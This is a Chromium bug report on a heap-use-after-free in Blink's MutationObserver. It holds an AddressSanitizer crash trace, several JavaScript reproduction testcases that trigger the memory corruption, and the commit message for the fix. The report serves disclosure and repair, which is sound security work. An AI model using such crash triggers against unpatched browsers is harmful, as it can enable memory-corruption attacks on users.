# Security: heap-use-after-free in blink::MutationObserver::enqueueMutationRecord

| Field | Value |
|-------|-------|
| **Issue ID** | [40083223](https://issues.chromium.org/issues/40083223) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>DOM |
| **Reporter** | cl...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2015-11-18 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest asan build of chrome as follows:

=================================================================  

==28931==ERROR: AddressSanitizer: heap-use-after-free on address 0x60700000f62c at pc 0x00000706e261 bp 0x7fff9e621470 sp 0x7fff9e621468  

READ of size 4 at 0x60700000f62c thread T0 (content\_shell)  

#0 0x706e260 in size third\_party/WebKit/Source/wtf/Vector.h:693:34  

#1 0x706e260 in append<WTF::PassRefPtr[blink::MutationRecord](javascript:void(0);) > third\_party/WebKit/Source/wtf/Vector.h:1145  

#2 0x706e260 in blink::MutationObserver::enqueueMutationRecord(WTF::PassRefPtr[blink::MutationRecord](javascript:void(0);)) third\_party/WebKit/Source/core/dom/MutationObserver.cpp:195  

#3 0x7085397 in blink::MutationObserverInterestGroup::enqueueMutationRecord(WTF::PassRefPtr[blink::MutationRecord](javascript:void(0);)) third\_party/WebKit/Source/core/dom/MutationObserverInterestGroup.cpp:82:9  

#4 0x735de0f in blink::ChildListMutationAccumulator::enqueueMutationRecord() third\_party/WebKit/Source/core/dom/ChildListMutationScope.cpp:143:5  

#5 0x735ca15 in blink::ChildListMutationAccumulator::leaveMutationScope() third\_party/WebKit/Source/core/dom/ChildListMutationScope.cpp:67:13  

#6 0x6e34a20 in blink::ChildListMutationScope::~ChildListMutationScope() third\_party/WebKit/Source/core/dom/ChildListMutationScope.h:108:13  

#7 0x6e2de04 in blink::ContainerNode::appendChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:776:1  

#8 0x709bc58 in blink::Node::appendChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/Node.cpp:482:16  

#9 0xb1fdae5 in appendChildMethodForMainWorld /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Node.cpp:715:39  

#10 0xb1fdae5 in blink::NodeV8Internal::appendChildMethodCallbackForMainWorld(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8Node.cpp:726  

#11 0x493c936 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#12 0x3723684 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>&) v8/src/builtins.cc:1842:34  

#13 0x3735339 in Builtin\_implHandleApiCall v8/src/builtins.cc:1865:3  

#14 0x3735339 in v8::internal::Builtin\_HandleApiCall(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/builtins.cc:1861  

#15 0x7fbdae30b61a (<unknown module>)  

#16 0x7fbdae33d9bc (<unknown module>)  

#17 0x7fbdae33d157 (<unknown module>)  

#18 0x7fbdae337163 (<unknown module>)  

#19 0x7fbdae31a8e1 (<unknown module>)  

#20 0x3c4cf4f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#21 0x3c4b6dd in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:167:10  

#22 0x35c694e in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1724:23  

#23 0xa707b5f in blink::V8ScriptRunner::runCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:393:18  

#24 0xa5f8d37 in blink::ScriptController::executeScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:190:21  

#25 0xa604899 in blink::ScriptController::evaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:566:35  

#26 0xa6056ee in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:539:5  

#27 0x73a63ac in blink::ScriptLoader::executeScript(blink::ScriptSourceCode const&, double\*) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:403:5  

#28 0x7397e80 in blink::ScriptLoader::prepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:272:14  

#29 0x7b3dc6e in blink::HTMLScriptRunner::runScript(blink::Element\*, WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:353:9  

#30 0x7b3d2ba in blink::HTMLScriptRunner::execute(WTF::PassRefPtr[blink::Element](javascript:void(0);), WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:215:5  

#31 0x7ae1d1b in blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:330:9  

#32 0x7ae8242 in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr[blink::HTMLDocumentParser::ParsedChunk](javascript:void(0);)) third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:525:13  

#33 0x7ae08cb in blink::HTMLDocumentParser::pumpPendingSpeculations() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:586:36  

#34 0x7adfcf3 in blink::HTMLDocumentParser::resumeParsingAfterYield() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:319:5  

#35 0x10ee3e44 in blink::CancellableTaskFactory::CancellableTask::run() third\_party/WebKit/Source/platform/scheduler/CancellableTaskFactory.cpp:29:9  

#36 0xd2657a0 in Run base/bind\_internal.h:157:12  

#37 0xd2657a0 in MakeItSo base/bind\_internal.h:293  

#38 0xd2657a0 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, void (scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::TypeList<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343  

#39 0x82822d in Run base/callback.h:396:12  

#40 0x82822d in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#41 0xd287901 in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::TaskQueueImpl\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:357:3  

#42 0xd280072 in scheduler::TaskQueueManager::DoWork(bool) components/scheduler/base/task\_queue\_manager.cc:282:13  

#43 0xd28ac00 in Run base/bind\_internal.h:176:12  

#44 0xd28ac00 in MakeItSo base/bind\_internal.h:303  

#45 0xd28ac00 in base::internal::Invoker<base::IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, void (scheduler::TaskQueueManager\*, bool), base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);), bool> >, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) >, base::internal::UnwrapTraits<bool> >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(bool)>, base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, bool const&> >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343  

#46 0x82822d in Run base/callback.h:396:12  

#47 0x82822d in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51  

#48 0x6b9780 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:481:3  

#49 0x6bb75b in DeferOrRunPendingTask base/message\_loop/message\_loop.cc:490:5  

#50 0x6bb75b in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:602  

#51 0x6c6d6e in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:32:21  

#52 0x6fa04e in base::RunLoop::Run() base/run\_loop.cc:55:3  

#53 0x6b65c8 in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:288:3  

#54 0xd44436c in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:211:7  

#55 0x622114 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:302:14  

#56 0x6239f4 in content::RunNamedProcessTypeMain(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:386:12  

#57 0x625a5a in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:804:12  

#58 0x620dfb in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:15  

#59 0x4f45af in main content/shell/app/shell\_main.cc:49:10  

#60 0x7fbf29d81a3f in \_\_libc\_start\_main /build/buildd/glibc-2.21/csu/libc-start.c:289

0x60700000f62c is located 44 bytes inside of 80-byte region [0x60700000f600,0x60700000f650)  

freed by thread T0 (content\_shell) here:  

#0 0x4cbaab in \_\_interceptor\_free (/home/nils/fuzzer3/runner/asan-linux-release-359663/content\_shell+0x4cbaab)  

#1 0xb14148a in deref third\_party/WebKit/Source/wtf/RefCounted.h:172:13  

#2 0xb14148a in blink::V8MutationObserver::derefObject(blink::ScriptWrappable\*) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8MutationObserver.cpp:180  

#3 0x6f6dd23 in derefObject third\_party/WebKit/Source/bindings/core/v8/WrapperTypeInfo.h:157:13  

#4 0x6f6dd23 in blink::ScriptWrappable::secondWeakCallback(v8::WeakCallbackInfo[blink::ScriptWrappable](javascript:void(0);) const&) third\_party/WebKit/Source/bindings/core/v8/ScriptWrappable.h:211  

#5 0x3d2854b in Invoke v8/src/global-handles.cc:967:3  

#6 0x3d2854b in InvokeSecondPassPhantomCallbacks v8/src/global-handles.cc:822  

#7 0x3d2854b in v8::internal::GlobalHandles::DispatchPendingPhantomCallbacks(bool) v8/src/global-handles.cc:941  

#8 0x3d28c02 in v8::internal::GlobalHandles::PostGarbageCollectionProcessing(v8::internal::GarbageCollector, v8::GCCallbackFlags) v8/src/global-handles.cc:988:18  

#9 0x3d50e11 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) v8/src/heap/heap.cc:1326:9  

#10 0x3d4db55 in v8::internal::Heap::CollectGarbage(v8::internal::GarbageCollector, char const\*, char const\*, v8::GCCallbackFlags) v8/src/heap/heap.cc:1002:11  

#11 0x3d4a837 in CollectGarbage v8/src/heap/heap-inl.h:531:10  

#12 0x3d4a837 in v8::internal::Heap::CollectAllGarbage(int, char const\*, v8::GCCallbackFlags) v8/src/heap/heap.cc:859  

#13 0x36504de in v8::Isolate::RequestGarbageCollectionForTesting(v8::Isolate::GarbageCollectionType) v8/src/api.cc:7138:5  

#14 0x493c936 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#15 0x3723684 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::(anonymous namespace)::BuiltinArguments<(v8::internal::BuiltinExtraArguments)1>&) v8/src/builtins.cc:1842:34  

#16 0x3735339 in Builtin\_implHandleApiCall v8/src/builtins.cc:1865:3  

#17 0x3735339 in v8::internal::Builtin\_HandleApiCall(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/builtins.cc:1861  

#18 0x7fbdae30b61a (<unknown module>)  

#19 0x7fbdae33e0f3 (<unknown module>)  

#20 0x7fbdae33df55 (<unknown module>)  

#21 0x7fbdae337163 (<unknown module>)  

#22 0x7fbdae31a8e1 (<unknown module>)  

#23 0x3c4cf4f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#24 0x3c4b6dd in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:167:10  

#25 0x35c694e in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1724:23  

#26 0xa707b5f in blink::V8ScriptRunner::runCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:393:18  

#27 0xa5f8d37 in blink::ScriptController::executeScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:190:21  

#28 0xa604899 in blink::ScriptController::evaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:566:35  

#29 0xa6056ee in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:539:5  

#30 0x73a63ac in blink::ScriptLoader::executeScript(blink::ScriptSourceCode const&, double\*) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:403:5  

#31 0x7397e80 in blink::ScriptLoader::prepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:272:14  

#32 0x73960cc in blink::ScriptLoader::didNotifySubtreeInsertionsToDocument() third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:93:9  

#33 0x6e37491 in blink::ContainerNode::notifyNodeInserted(blink::Node&, blink::ContainerNode::ChildrenChangeSource) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:828:13  

#34 0x6e3230d in blink::ContainerNode::updateTreeAfterInsertion(blink::Node&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1280:5  

#35 0x6e2dbcd in blink::ContainerNode::appendChild(WTF::PassRefPtr[blink::Node](javascript:void(0);), blink::ExceptionState&) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:771:9

previously allocated by thread T0 (content\_shell) here:  

#0 0x4cbd8b in \_\_interceptor\_malloc (/home/nils/fuzzer3/runner/asan-linux-release-359663/content\_shell+0x4cbd8b)  

#1 0x7069f77 in partitionAllocGenericFlags third\_party/WebKit/Source/wtf/PartitionAlloc.h:738:20  

#2 0x7069f77 in partitionAllocGeneric third\_party/WebKit/Source/wtf/PartitionAlloc.h:762  

#3 0x7069f77 in fastMalloc third\_party/WebKit/Source/wtf/Partitions.h:108  

#4 0x7069f77 in operator new third\_party/WebKit/Source/wtf/RefCounted.h:166  

#5 0x7069f77 in blink::MutationObserver::create(WTF::PassOwnPtr[blink::MutationCallback](javascript:void(0);)) third\_party/WebKit/Source/core/dom/MutationObserver.cpp:60  

#6 0xb6a5b66 in blink::V8MutationObserver::constructorCustom(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) third\_party/WebKit/Source/bindings/core/v8/custom/V8MutationObserverCustom.cpp:64:53  

#7 0xb141832 in blink::V8MutationObserver::constructorCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) /mnt/data/b/build/slave/ASAN\_Release/build/src/out/Release/gen/blink/bindings/core/v8/V8MutationObserver.cpp:127:5  

#8 0x493c936 in v8::internal::FunctionCallbackArguments::Call(void (\*)(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&)) v8/src/arguments.cc:33:3  

#9 0x37362b9 in HandleApiCallHelper<true> v8/src/builtins.cc:1842:34  

#10 0x37362b9 in Builtin\_implHandleApiCallConstruct v8/src/builtins.cc:1875  

#11 0x37362b9 in v8::internal::Builtin\_HandleApiCallConstruct(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/builtins.cc:1871  

#12 0x7fbdae30b61a (<unknown module>)  

#13 0x7fbdae337032 (<unknown module>)  

#14 0x7fbdae33d65d (<unknown module>)  

#15 0x7fbdae33d157 (<unknown module>)  

#16 0x7fbdae337163 (<unknown module>)  

#17 0x7fbdae31a8e1 (<unknown module>)  

#18 0x3c4cf4f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) v8/src/execution.cc:98:13  

#19 0x3c4b6dd in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:167:10  

#20 0x35c694e in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1724:23  

#21 0xa707b5f in blink::V8ScriptRunner::runCompiledScript(v8::Isolate\*, v8::Local[v8::Script](javascript:void(0);), blink::ExecutionContext\*) third\_party/WebKit/Source/bindings/core/v8/V8ScriptRunner.cpp:393:18  

#22 0xa5f8d37 in blink::ScriptController::executeScriptAndReturnValue(v8::Local[v8::Context](javascript:void(0);), blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:190:21  

#23 0xa604899 in blink::ScriptController::evaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:566:35  

#24 0xa6056ee in blink::ScriptController::executeScriptInMainWorld(blink::ScriptSourceCode const&, blink::AccessControlStatus, double\*) third\_party/WebKit/Source/bindings/core/v8/ScriptController.cpp:539:5  

#25 0x73a63ac in blink::ScriptLoader::executeScript(blink::ScriptSourceCode const&, double\*) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:403:5  

#26 0x7397e80 in blink::ScriptLoader::prepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third\_party/WebKit/Source/core/dom/ScriptLoader.cpp:272:14  

#27 0x7b3dc6e in blink::HTMLScriptRunner::runScript(blink::Element\*, WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:353:9  

#28 0x7b3d2ba in blink::HTMLScriptRunner::execute(WTF::PassRefPtr[blink::Element](javascript:void(0);), WTF::TextPosition const&) third\_party/WebKit/Source/core/html/parser/HTMLScriptRunner.cpp:215:5  

#29 0x7ae1d1b in blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:330:9  

#30 0x7ae8242 in blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser(WTF::PassOwnPtr[blink::HTMLDocumentParser::ParsedChunk](javascript:void(0);)) third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:525:13  

#31 0x7ae08cb in blink::HTMLDocumentParser::pumpPendingSpeculations() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:586:36  

#32 0x7adfcf3 in blink::HTMLDocumentParser::resumeParsingAfterYield() third\_party/WebKit/Source/core/html/parser/HTMLDocumentParser.cpp:319:5  

#33 0x10ee3e44 in blink::CancellableTaskFactory::CancellableTask::run() third\_party/WebKit/Source/platform/scheduler/CancellableTaskFactory.cpp:29:9  

#34 0xd2657a0 in Run base/bind\_internal.h:157:12  

#35 0xd2657a0 in MakeItSo base/bind\_internal.h:293  

#36 0xd2657a0 in base::internal::Invoker<base::IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, void (scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >), base::internal::TypeList<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) >)>, base::internal::TypeList<scoped\_ptr<blink::WebTaskRunner::Task, base::DefaultDeleter[blink::WebTaskRunner::Task](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343  

#37 0x82822d in Run base/callback.h:396:12  

#38 0x82822d in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/WebKit/Source/wtf/Vector.h:693:34 in size  

Shadow bytes around the buggy address:  

0x0c0e7fff9e70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0e7fff9e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c0e7fff9e90: fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00  

0x0c0e7fff9ea0: fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa  

0x0c0e7fff9eb0: fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa  

=>0x0c0e7fff9ec0: fd fd fd fd fd[fd]fd fd fd fd fa fa fa fa 00 00  

0x0c0e7fff9ed0: 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00  

0x0c0e7fff9ee0: 00 00 00 00 00 fa fa fa fa fa fd fd fd fd fd fd  

0x0c0e7fff9ef0: fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd  

0x0c0e7fff9f00: fd fa fa fa fa fa fd fd fd fd fd fd fd fd fd fa  

0x0c0e7fff9f10: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb

**VERSION**  

Chrome Version: asan-linux-release-359663

**REPRODUCTION CASE**  

The testcase requires the command line argument: --js-flags=--expose-gc

<script>
function start() {
o1335=document.createElementNS('http://www.w3.org/1999/xhtml','input');
o1442=document.createElementNS('http://www.w3.org/1999/xhtml','script');
o1444=document.createElement('iframe');
o1442.appendChild(o1444);
document.documentElement.appendChild(o1442);
o1444.appendChild(o1335);
o1467=document.createElementNS('http://www.w3.org/1999/xhtml','input');
o1470=new MutationObserver(function() {} );
o1470.observe(o1335, {childList: true, characterData: true, characterDataOldValue: true, attributeOldValue: true});
o1490=document.createElementNS('http://www.w3.org/1999/xhtml','script');
o1491=document.createTextNode('glob\_appendscript\_1018()');
o1490.appendChild(o1491);
o1467.appendChild(o1490);
o1335.appendChild(o1467);
}
function glob\_appendscript\_1018() {
o1470['disconnect']();
delete o1470;
gc();
}
start();
</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### cl...@chromium.org (2015-11-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6232469256273920

### wf...@chromium.org (2015-11-19)

[Empty comment from Monorail migration]

### wf...@chromium.org (2015-11-19)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-11-19)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6232469256273920

Uploader: wfh@chromium.org
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x60d00008043c
Crash State:
  blink::MutationObserver::enqueueMutationRecord
  blink::MutationObserverInterestGroup::enqueueMutationRecord
  blink::ChildListMutationAccumulator::enqueueMutationRecord
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696

Minimized Testcase (0.88 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96zsglx6ppOaQcnGqdsxdVsK0W7z9KbwHOcxF77GmEidQNVoDXiz9qh8ngwIyWhpLqm0set7MxXmVjw5CAFMGLbxWeE6sQIa6Jv950wlcADjxI_QRcwYm0vB4ZsYxUJ_ZoTo8U8mSdBQURDXj3Fc8ZevU6SzA
<script>
        o1335=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        o1442=document.createElementNS('http://www.w3.org/1999/xhtml','script');
        o1444=document.createElement('iframe');
        o1442.appendChild(o1444);
        document.documentElement.appendChild(o1442);
        o1444.appendChild(o1335);
        o1467=document.createElementNS('http://www.w3.org/1999/xhtml','input');
        o1470=new MutationObserver(function() {} );
        o1470.observe(o1335, {childList: true});
        o1490=document.createElementNS('http://www.w3.org/1999/xhtml','script');
        o1491=document.createTextNode('glob_appendscript_1018()');
        o1490.appendChild(o1491);
        o1467.appendChild(o1490);
        o1335.appendChild(o1467);
function glob_appendscript_1018() {
        o1470['disconnect']();
        delete o1470;
        gc();
}
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### wf...@chromium.org (2015-11-19)

tkent - can you take a look at this one?

### tk...@chromium.org (2015-11-19)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-11-19)

[Empty comment from Monorail migration]

### ko...@chromium.org (2015-11-19)

Further minimized the case.
I'll take a look.

<script>
div=document.createElement('div');
div2=document.createElement('div');
document.documentElement.appendChild(div);

MO=new MutationObserver(function(){});
MO.observe(div,{childList: true});
script=document.createElement('script');
script.textContent='func()';
div2.appendChild(script);
div.appendChild(div2);

function func() {
  MO.disconnect();
  delete MO;
  gc();
}
</script>

### bu...@chromium.org (2015-11-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/a17c2c87065be2c4dcb586583b1d69a5c85dae20

commit a17c2c87065be2c4dcb586583b1d69a5c85dae20
Author: kochi <kochi@chromium.org>
Date: Thu Nov 19 07:17:44 2015

Use RefPtr for MutationObserver in MutationObserverInterestGroup.

In MutaionObserverInterestGroup, MutationObservers were held in HashSet
as raw pointers.  In case a MutationObserver is gone while mutation
events are collected (and garbage collector collects the object),
it causes use-after-free while the code tries to enqueue the recorded
mutation events.  Use RefPtr<> to hold the pointer so that the object
will be kept until it goes out of scope.

BUG=557981
TEST=fast/dom/MutationObserver/mutation-and-deletion-race.html

Review URL: https://codereview.chromium.org/1463433002

Cr-Commit-Position: refs/heads/master@{#360541}

